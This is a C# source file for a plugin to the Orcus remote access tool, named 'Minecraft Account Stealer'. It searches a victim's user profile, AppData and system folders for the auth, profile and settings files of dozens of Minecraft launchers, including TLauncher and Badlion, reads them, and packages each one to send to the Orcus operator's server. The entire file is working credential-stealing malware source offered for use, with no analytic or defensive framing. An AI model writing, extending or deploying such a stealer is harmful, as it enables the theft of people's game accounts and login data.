using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;

namespace MinecraftStealer
{
    public class MinecraftStealerCommand : Command
    {
        public override string Name => "Minecraft Account Stealer";
        public override string Description => "Steals Minecraft accounts from various launchers";
        public override uint CommandId => 42;

        [CommandProperty(Description = "Scan User Profile directories")]
        public bool UserTrue { get; set; } = true;

        [CommandProperty(Description = "Scan AppData directories")]
        public bool AppDataTrue { get; set; } = true;

        [CommandProperty(Description = "Scan System directories")]
        public bool SystemTrue { get; set; } = true;

        [CommandProperty(Description = "Scan Badlion Client")]
        public bool BadlionTrue { get; set; } = true;

        [CommandProperty(Description = "Scan TLauncher")]
        public bool TlauncherTrue { get; set; } = true;

        public override void ProcessCommand(byte[] parameter, IClientInfo clientInfo)
        {
            try
            {
                var recoveredData = RecoverMinecraftData();

                if (recoveredData.Count > 0)
                {
                    // Send each file to server
                    foreach (var data in recoveredData)
                    {
                        string fileName = (string)data[0];
                        byte[] fileData = (byte[])data[1];

                        // Send file to Orcus server
                        SendFileData(fileName, fileData);
                    }

                    ResponseResult((byte)CommandResponse.Success,
                        $"Successfully recovered {recoveredData.Count} Minecraft files");
                }
                else
                {
                    ResponseResult((byte)CommandResponse.Failed,
                        "No Minecraft account data found");
                }
            }
            catch (Exception ex)
            {
                ResponseResult((byte)CommandResponse.Error,
                    $"Error: {ex.Message}");
            }
        }

        private List<object[]> RecoverMinecraftData()
        {
            List<object[]> list = new List<object[]>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string system = Environment.GetFolderPath(Environment.SpecialFolder.System);

            if (UserTrue)
            {
                ScanDirectory(userProfile, list, new Dictionary<string, string>
                {
                    { "\\loliland\\auth.json", "Minecraft/loliland/auth.json" },
                    { "\\.cristalix\\settings.bin", "Minecraft/cristalix/settings.bin" },
                    { "\\.prostocraft\\settings.json", "Minecraft/prostocraft/settings.json" },
                    { "\\Pentacraft\\settings.bin", "Minecraft/Pentacraft/settings.bin" },
                    { "\\ARAGO\\settings.bin", "Minecraft/ARAGO/settings.bin" },
                    { "\\mcdayz\\settings.bin", "Minecraft/mcdayz/settings.bin" },
                    { "\\cubixworld\\settings.bin", "Minecraft/cubixworld/settings.bin" },
                    { "\\orangecraft\\settings.bin", "Minecraft/orangecraft/settings.bin" },
                    { "\\Letragon\\settings.bin", "Minecraft/Letragon/settings.bin" },
                    { "\\MythicalWorld\\settings.bin", "Minecraft/MythicalWorld/settings.bin" }
                });
            }

            if (AppDataTrue)
            {
                ScanDirectory(appData, list, new Dictionary<string, string>
                {
                    { "\\.BlackDragoN\\launcher.config", "Minecraft/BlackDragoN/launcher.config" },
                    { "\\.LavaServer\\Settings.reg", "Minecraft/LavaServer/Settings.reg" },
                    { "\\.minecraftonly\\userdata", "Minecraft/minecraftonly/userdata" },
                    { "\\McSkill\\settings.bin", "Minecraft/McSkill/settings.bin" },
                    { "\\VictoryCraft\\settings.bin", "Minecraft/VictoryCraft/settings.bin" },
                    { "\\.simplemc\\profiles.json", "Minecraft/simplemc/profiles.json" },
                    { "\\Borealis.su\\settings.json", "Minecraft/Borealis/settings.json" },
                    { "\\GamaiLauncher\\settings.json", "Minecraft/GamaiLauncher/settings.json" },
                    { "\\GravityCraft\\settings.json", "Minecraft/GravityCraft/settings.json" },
                    { "\\ShadowCraft\\settings.bin", "Minecraft/ShadowCraft/settings.bin" },
                    { "\\SideMC\\settings.bin", "Minecraft/SideMC/settings.bin" },
                    { "\\StreamCraft\\profiles.json", "Minecraft/StreamCraft/profiles.json" },
                    { "\\.exlauncher\\profile.dat", "Minecraft/exlauncher/profile.dat" },
                    { "\\GamePoint\\settings.json", "Minecraft/GamePoint/settings.json" },
                    { "\\.redserver\\settings.json", "Minecraft/redserver/settings.json" },
                    { "\\.rus-minecraft\\settings.json", "Minecraft/rus-minecraft/settings.json" },
                    { "\\TikTokWorld\\settings.json", "Minecraft/TikTokWorld/settings.json" },
                    { "\\FineMine0\\settings.json", "Minecraft/FineMine0/settings.json" },
                    { "\\.cXPLauncher\\settings.json", "Minecraft/cXPLauncher/settings.json" },
                    { "\\.mix-servers2\\launcher.config", "Minecraft/mix-servers2/launcher.config" }
                });

                // Special files
                if (File.Exists(appData + "HcsLauncher-auto-login.json"))
                {
                    AddFileToList(list, appData + "HcsLauncher-auto-login.json",
                        "Minecraft/HcsLauncher-auto-login.json");
                }
            }

            if (SystemTrue)
            {
                ScanDirectory(system, list, new Dictionary<string, string>
                {
                    { "\\.warmine\\config.json", "Minecraft/warmine/config.json" },
                    { "\\.lemoncraft\\launcher.dat", "Minecraft/lemoncraft/launcher.dat" }
                });
            }

            if (BadlionTrue)
            {
                string badlionPath = appData + "\\Badlion Client\\";
                if (Directory.Exists(badlionPath))
                {
                    AddFileToList(list, badlionPath + "auth.data", "Minecraft/Badlion/auth.data");
                    AddFileToList(list, badlionPath + "config.json", "Minecraft/Badlion/config.json");
                }
            }

            if (TlauncherTrue)
            {
                ScanTLauncher(appData, list);
            }

            return list;
        }

        private void ScanDirectory(string basePath, List<object[]> list, Dictionary<string, string> files)
        {
            foreach (var file in files)
            {
                string fullPath = basePath + file.Key;
                if (File.Exists(fullPath))
                {
                    AddFileToList(list, fullPath, file.Value);
                }
            }
        }

        private void ScanTLauncher(string appData, List<object[]> list)
        {
            string[] tlauncherPaths = {
                appData + "\\.minecraft\\",
                "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\.minecraft\\",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\.minecraft\\"
            };

            foreach (string path in tlauncherPaths)
            {
                if (Directory.Exists(path))
                {
                    AddFileToList(list, path + "launcher_profiles.json",
                        $"Minecraft/TLauncher/{Path.GetFileName(Path.GetDirectoryName(path))}/launcher_profiles.json");

                    AddFileToList(list, path + "TlauncherProfiles.json",
                        $"Minecraft/TLauncher/{Path.GetFileName(Path.GetDirectoryName(path))}/TlauncherProfiles.json");
                }
            }
        }

        private void AddFileToList(List<object[]> list, string filePath, string virtualPath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    byte[] fileData = File.ReadAllBytes(filePath);
                    list.Add(new object[] { virtualPath, fileData });
                }
            }
            catch (Exception)
            {
                // Ignore errors for individual files
            }
        }

        private void SendFileData(string fileName, byte[] data)
        {
            // Create package with file data
            byte[] fileNameBytes = System.Text.Encoding.UTF8.GetBytes(fileName);
            byte[] packageData = new byte[4 + fileNameBytes.Length + data.Length];

            // Write fileName length
            BitConverter.GetBytes(fileNameBytes.Length).CopyTo(packageData, 0);
            // Write fileName
            fileNameBytes.CopyTo(packageData, 4);
            // Write file data
            data.CopyTo(packageData, 4 + fileNameBytes.Length);

            // Send package to Orcus server
            SendPackage(new CommandPackage
            {
                CommandId = CommandId,
                Data = packageData
            });
        }

        public override CommandView GetView()
        {
            return new MinecraftStealerView();
        }
    }

    public class MinecraftStealerView : CommandView
    {
        public override string Name => "Minecraft Account Stealer";
        public override string Description => "View stolen Minecraft accounts";

        public override void InitializeView()
        {
            // View initialization for Orcus panel
        }
    }

    public enum CommandResponse : byte
    {
        Success = 1,
        Failed = 2,
        Error = 3
    }
}